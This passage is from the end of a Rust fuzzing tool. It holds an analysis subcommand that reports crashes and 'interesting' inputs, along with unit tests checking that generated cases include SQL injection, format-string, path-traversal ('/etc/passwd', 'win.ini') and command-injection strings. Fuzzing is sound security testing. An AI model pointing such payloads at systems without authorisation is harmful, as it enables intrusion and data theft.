                seed: rand::thread_rng().gen(),
                timeout_ms: 5000,
                delay_ms: 100,
                prefix: None,
                suffix: None,
            };

            let mut fuzzer = HttpFuzzer::new(url, method, param, config);
            fuzzer.run(args.verbose)?;
        }

        Commands::Analyze { input } => {
            let content = std::fs::read_to_string(&input)?;
            let summary: FuzzSummary = serde_json::from_str(&content)?;

            println!("\n{}", "[ FUZZING ANALYSIS ]".cyan().bold());
            println!("  Target:       {}", summary.target);
            println!("  Fuzz Type:    {:?}", summary.config.fuzz_type);
            println!("  Start:        {}", summary.start_time);
            println!("  End:          {}", summary.end_time);
            println!("\n{}", "[ STATISTICS ]".cyan());
            println!("  Total:        {}", summary.total_tests);
            println!("  Successful:   {}", summary.successful);
            println!("  Timeouts:     {}", summary.timeouts);
            println!("  Crashes:      {}", summary.crashes);
            println!("  Errors:       {}", summary.errors);

            if !summary.interesting.is_empty() {
                println!("\n{}", "[ INTERESTING CASES ]".red().bold());
                for result in &summary.interesting {
                    println!("\n  Test #{}", result.index);
                    println!("    Input Length: {} bytes", result.input.len());
                    if let Some(ref hex) = result.input_hex {
                        println!("    Hex: {}", &hex[..hex.len().min(100)]);
                    }
                    if let Some(ref resp) = result.response {
                        println!("    Response: {}", resp);
                    }
                    if result.crashed {
                        println!("    {}", "CAUSED CRASH/DISCONNECT".red().bold());
                    }
                }
            }
        }
    }

    Ok(())
}

// ============================================================================
// TESTS
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_string_generation() {
        let mut gen = TestCaseGenerator::new(FuzzType::String, 42);
        let cases = gen.generate_all(50);

        assert_eq!(cases.len(), 50);
        // Should have variety of lengths
        let lengths: Vec<_> = cases.iter().map(|c| c.len()).collect();
        assert!(lengths.iter().any(|&l| l > 100));
    }

    #[test]
    fn test_integer_generation() {
        let mut gen = TestCaseGenerator::new(FuzzType::Integer, 42);
        let cases = gen.generate_all(20);

        assert_eq!(cases.len(), 20);
        // All should be parseable text
        for case in &cases {
            let s = String::from_utf8_lossy(case);
            assert!(!s.is_empty());
        }
    }

    #[test]
    fn test_binary_generation() {
        let mut gen = TestCaseGenerator::new(FuzzType::Binary, 42);
        let cases = gen.generate_all(10);

        assert_eq!(cases.len(), 10);
        // Binary should have non-printable chars
        let has_nonprintable = cases.iter().any(|c| {
            c.iter().any(|&b| b < 0x20 || b > 0x7e)
        });
        assert!(has_nonprintable);
    }

    #[test]
    fn test_format_string_generation() {
        let mut gen = TestCaseGenerator::new(FuzzType::FormatString, 42);
        let cases = gen.generate_all(20);

        // Should contain format specifiers
        let has_format = cases.iter().any(|c| {
            let s = String::from_utf8_lossy(c);
            s.contains('%')
        });
        assert!(has_format);
    }

    #[test]
    fn test_sql_generation() {
        let mut gen = TestCaseGenerator::new(FuzzType::Sql, 42);
        let cases = gen.generate_all(30);

        // Should contain SQL keywords
        let has_sql = cases.iter().any(|c| {
            let s = String::from_utf8_lossy(c).to_uppercase();
            s.contains("OR") || s.contains("UNION") || s.contains("SELECT")
        });
        assert!(has_sql);
    }

    #[test]
    fn test_cyclic_pattern() {
        let mut gen = TestCaseGenerator::new(FuzzType::Overflow, 42);
        let pattern = gen.generate_cyclic_pattern(100);

        assert_eq!(pattern.len(), 100);

        // Check pattern is unique (no 4-byte sequence repeats)
        let mut seen = std::collections::HashSet::new();
        for chunk in pattern.windows(4) {
            assert!(seen.insert(chunk.to_vec()), "Duplicate pattern found");
        }
    }

    #[test]
    fn test_reproducibility() {
        let mut gen1 = TestCaseGenerator::new(FuzzType::String, 12345);
        let mut gen2 = TestCaseGenerator::new(FuzzType::String, 12345);

        let cases1 = gen1.generate_all(10);
        let cases2 = gen2.generate_all(10);

        assert_eq!(cases1, cases2, "Same seed should produce same results");
    }

    #[test]
    fn test_path_traversal_generation() {
        let mut gen = TestCaseGenerator::new(FuzzType::Path, 42);
        let cases = gen.generate_all(20);

        let has_traversal = cases.iter().any(|c| {
            let s = String::from_utf8_lossy(c);
            s.contains("..") || s.contains("/etc/passwd") || s.contains("win.ini")
        });
        assert!(has_traversal);
    }

    #[test]
    fn test_command_injection_generation() {
        let mut gen = TestCaseGenerator::new(FuzzType::Command, 42);
        let cases = gen.generate_all(20);

        let has_cmd = cases.iter().any(|c| {
            let s = String::from_utf8_lossy(c);
            s.contains(';') || s.contains('|') || s.contains('`')
        });
        assert!(has_cmd);
    }
}

// URL encoding helper
mod urlencoding {
    pub fn encode(s: &str) -> String {
        let mut result = String::new();
        for c in s.chars() {
            match c {
                'a'..='z' | 'A'..='Z' | '0'..='9' | '-' | '_' | '.' | '~' => {
                    result.push(c);
                }
                _ => {
                    for byte in c.to_string().as_bytes() {
                        result.push_str(&format!("%{:02X}", byte));
                    }
                }
            }
        }
        result
    }
}
